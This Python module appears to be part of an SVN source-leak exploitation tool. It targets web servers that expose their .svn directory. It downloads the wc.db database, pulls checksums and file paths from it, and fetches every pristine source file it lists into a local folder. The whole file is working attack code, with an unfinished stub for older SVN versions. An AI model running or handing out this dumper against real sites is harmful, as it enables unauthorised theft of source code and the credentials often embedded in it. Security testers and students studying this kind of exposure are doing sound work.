#!/usr/bin/env python3
# -*- coding=utf-8 -*-

"""
SVN源代码泄露利用工具
"""

import os
import re
import sqlite3
import click
from tempfile import NamedTemporaryFile
from aiomultiprocess import Pool
from ..dumper import BasicDumper


class Dumper(BasicDumper):
    """ .svn Dumper """

    def __init__(self, url, outdir):
        super(Dumper, self).__init__(url, outdir)
        self.base_url = re.sub(".svn.*", ".svn", url)

    async def start(self):
        """ dumper入口方法 """
        entries_url = self.base_url + "/entries"
        data = await self.fetch(entries_url)
        if data == b"12\n":
            await self.dump()
        else:
            click.secho("DUMP LEGACY", fg="yellow")
            await self.dump_legacy()

    async def dump(self):
        """ 针对svn1.7以后的版本 """
        db_url = self.base_url + "/wc.db"
        # 创建一个临时文件用来存储wc.db
        tmpfile = NamedTemporaryFile()
        data = await self.fetch(db_url)
        with open(tmpfile.name, "wb") as f:
            f.write(data)

        # 从wc.db中解析URL和文件名
        for item in self.parse(tmpfile.name):
            sha1, filename = item
            if not sha1 or not filename:
                continue
            # sha1: $sha1$82e5777817f98354c205006bf7b68ffba018c1ec
            url = "%s/pristine/%s/%s.svn-base" % (self.base_url, sha1[6:8], sha1[6:])
            self.targets.append((url, filename))

        tmpfile.close()

        async with Pool() as pool:
            await pool.map(self.download, self.targets)

    async def dump_legacy(self):
        """ 针对svn1.7以前的版本 """
        pass

    async def download(self, target):
        """ 下载任务（协程） """
        url, filename = target
        click.echo("%s %s" % (url, filename))

        # 创建目标目录（filename可能包含部分目录）
        fullname = os.path.join(self.outdir, filename)
        outdir = os.path.dirname(fullname)
        if outdir and not os.path.exists(outdir):
            os.makedirs(outdir)

        # 保存数据到文件
        data = await self.fetch(url)
        with open(fullname, "wb") as f:
            f.write(data)

    def parse(self, file) -> list:
        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
        try:
            conn = sqlite3.connect(file)
            cursor = conn.cursor()
            cursor.execute("select checksum, local_relpath from NODES")
            items = cursor.fetchall()
            conn.close()
            return items
        except Exception as e:
            click.secho("Sqlite connection failed.", fg="red")
            click.secho(e.args, fg="red")
